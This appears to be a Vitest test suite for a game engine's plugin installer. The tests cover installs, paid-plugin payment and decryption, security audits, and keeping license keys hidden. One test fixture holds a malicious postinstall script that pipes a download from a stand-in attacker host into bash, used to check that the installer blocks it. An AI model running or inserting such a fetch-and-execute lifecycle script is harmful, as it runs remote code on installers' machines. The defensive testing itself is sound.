import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';

const tempRoots = [];

afterEach(() => {
  while (tempRoots.length) rmSync(tempRoots.pop(), { recursive: true, force: true });
});

describe('OmniCore plugin installer platform', () => {
  it('validates plugin.json and installs a free npm plugin into addons while updating package.json', async () => {
    const { PluginInstaller } = await importModule('src/package/PluginInstaller.js');
    const root = makeProjectRoot();
    const downloads = [];
    const installer = new PluginInstaller({
      root,
      downloader: async (request) => {
        downloads.push(request);
        return {
          manifest: {
            name: 'omni-particles',
            displayName: 'Omni Particles',
            version: '1.2.3',
            main: 'src/index.js',
            author: 'OmniCore Labs',
            license: 'MIT',
            packageName: '@omnicore/omni-particles',
            source: 'npm:@omnicore/omni-particles'
          },
          files: {
            'plugin.json': JSON.stringify({
              name: 'omni-particles',
              displayName: 'Omni Particles',
              version: '1.2.3',
              main: 'src/index.js',
              author: 'OmniCore Labs',
              license: 'MIT'
            }, null, 2),
            'src/index.js': 'export default function particles() { return "ok"; }\n'
          }
        };
      }
    });

    const result = await installer.install('omni-particles', { source: 'npm:@omnicore/omni-particles' });
    const packageJson = JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8'));

    expect(downloads[0]).toMatchObject({ name: 'omni-particles', source: 'npm:@omnicore/omni-particles' });
    expect(result.addonPath).toBe(path.join(root, 'addons', 'omni-particles'));
    expect(result.manifest).toMatchObject({ name: 'omni-particles', version: '1.2.3' });
    expect(existsSync(path.join(root, 'addons', 'omni-particles', 'plugin.json'))).toBe(true);
    expect(packageJson.dependencies).toMatchObject({ '@omnicore/omni-particles': '1.2.3' });
  });

  it('runs payment and decrypts paid git plugin bundles before install', async () => {
    const { PluginInstaller } = await importModule('src/package/PluginInstaller.js');
    const root = makeProjectRoot();
    const paymentRequests = [];
    const decryptRequests = [];
    const installer = new PluginInstaller({
      root,
      payment: {
        async requestPayment(request) {
          paymentRequests.push(request);
          return { ok: true, licenseKey: 'paid-license', receiptId: 'receipt-1' };
        }
      },
      decryptor: {
        async decrypt(bundle, licenseKey) {
          decryptRequests.push({ bundle, licenseKey });
          return {
            ...bundle,
            encrypted: false,
            files: {
              'plugin.json': JSON.stringify(bundle.manifest, null, 2),
              'src/index.js': 'export default function premium() { return true; }\n'
            }
          };
        }
      },
      downloader: async () => ({
        encrypted: true,
        payload: 'encrypted-bytes',
        manifest: {
          name: 'premium-ai',
          displayName: 'Premium AI',
          version: '2.0.0',
          main: 'src/index.js',
          author: 'Studio',
          license: 'Commercial',
          packageName: '@omnicore/premium-ai',
          source: 'git:https://example.com/premium-ai.git',
          isPaid: true,
          priceCents: 4900,
          paymentProvider: 'qrcode'
        }
      })
    });

    const result = await installer.install('premium-ai', { source: 'git:https://example.com/premium-ai.git' });

    expect(paymentRequests[0]).toMatchObject({ plugin: 'premium-ai', amountCents: 4900, provider: 'qrcode' });
    expect(decryptRequests[0]).toMatchObject({ licenseKey: 'paid-license' });
    expect(result.manifest.isPaid).toBe(true);
    expect(result.receipt).toMatchObject({ receiptId: 'receipt-1' });
    expect(existsSync(path.join(root, 'addons', 'premium-ai', 'src', 'index.js'))).toBe(true);
  });

  it('blocks plugin bundles with malicious lifecycle scripts or shell download execution', async () => {
    const { PluginInstaller } = await importModule('src/package/PluginInstaller.js');
    const root = makeProjectRoot();
    const installer = new PluginInstaller({
      root,
      downloader: async () => ({
        manifest: {
          name: 'bad-plugin',
          displayName: 'Bad Plugin',
          version: '1.0.0',
          main: 'index.js',
          author: 'unknown',
          license: 'MIT',
          scripts: { postinstall: 'curl https://evil.example/install.sh | bash' }
        },
        files: { 'plugin.json': '{}', 'index.js': 'eval("bad")\n' }
      })
    });

    await expect(installer.install('bad-plugin', { source: 'npm:bad-plugin' })).rejects.toThrow(/malicious|dangerous/iu);
  });

  it('requires declared permissions, sha256 integrity, and blocks dangerous bundle files with error codes', async () => {
    const { PluginInstaller } = await importModule('src/package/PluginInstaller.js');
    const root = makeProjectRoot();
    const installer = new PluginInstaller({
      root,
      downloader: async () => ({
        manifest: {
          name: 'unsafe-plugin',
          displayName: 'Unsafe Plugin',
          version: '1.0.0',
          main: 'src/index.js',
          author: 'unknown',
          license: 'MIT',
          permissions: ['filesystem', 'network'],
          sha256: 'not-a-sha'
        },
        files: {
          'plugin.json': '{}',
          'src/index.js': 'export default function plugin() { return true; }\n',
          '.github/workflows/publish.yml': 'name: publish\n'
        }
      })
    });

    await expect(installer.install('unsafe-plugin', { source: 'npm:unsafe-plugin' })).rejects.toMatchObject({
      code: 'plugin-security-audit-failed',
      details: expect.objectContaining({
        errors: expect.arrayContaining([
          expect.objectContaining({ code: 'undeclared-permission-justification' }),
          expect.objectContaining({ code: 'invalid-plugin-sha256' }),
          expect.objectContaining({ code: 'dangerous-plugin-file' })
        ])
      })
    });
  });

  it('does not expose paid plugin license keys in install results or written files', async () => {
    const { PluginInstaller } = await importModule('src/package/PluginInstaller.js');
    const root = makeProjectRoot();
    const installer = new PluginInstaller({
      root,
      payment: {
        async requestPayment() {
          return { ok: true, licenseKey: 'secret-license-key', receiptId: 'receipt-2' };
        }
      },
      decryptor: {
        async decrypt(bundle) {
          return {
            ...bundle,
            encrypted: false,
            files: {
              'plugin.json': JSON.stringify(bundle.manifest, null, 2),
              'src/index.js': 'export default function paid() { return true; }\n'
            }
          };
        }
      },
      downloader: async () => ({
        encrypted: true,
        manifest: {
          name: 'paid-safe',
          displayName: 'Paid Safe',
          version: '1.0.0',
          main: 'src/index.js',
          author: 'Studio',
          license: 'Commercial',
          packageName: '@omnicore/paid-safe',
          isPaid: true,
          priceCents: 1200,
          paymentProvider: 'qrcode',
          permissions: [],
          sha256: '0'.repeat(64)
        }
      })
    });

    const result = await installer.install('paid-safe', { source: 'npm:@omnicore/paid-safe' });
    const resultJson = JSON.stringify(result);
    const pluginJson = readFileSync(path.join(root, 'addons', 'paid-safe', 'plugin.json'), 'utf8');

    expect(resultJson).not.toContain('secret-license-key');
    expect(pluginJson).not.toContain('secret-license-key');
    expect(result.receipt).toEqual({ ok: true, receiptId: 'receipt-2' });
  });
});

function makeProjectRoot() {
  const root = mkdtempSync(path.join(tmpdir(), 'omnicore-plugin-install-'));
  tempRoots.push(root);
  mkdirSync(root, { recursive: true });
  writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'game', dependencies: {} }, null, 2), 'utf8');
  return root;
}

function importModule(relativePath) {
  return import(pathToFileURL(path.resolve(relativePath)).href);
}
